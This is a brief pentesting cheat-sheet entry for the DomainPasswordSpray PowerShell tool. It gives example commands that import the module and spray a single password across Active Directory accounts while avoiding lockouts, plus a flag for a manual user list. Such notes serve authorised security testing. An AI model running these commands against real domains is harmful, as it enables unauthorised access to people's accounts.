[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) automatically generates a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out
# Example Usage
```powershell
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password <PASS> -OutFile <OUTPUT.FILE> -ErrorAction SilentlyContinue
```
## Useful Flags
- `-UserList`: If not AD joined, provide manual user list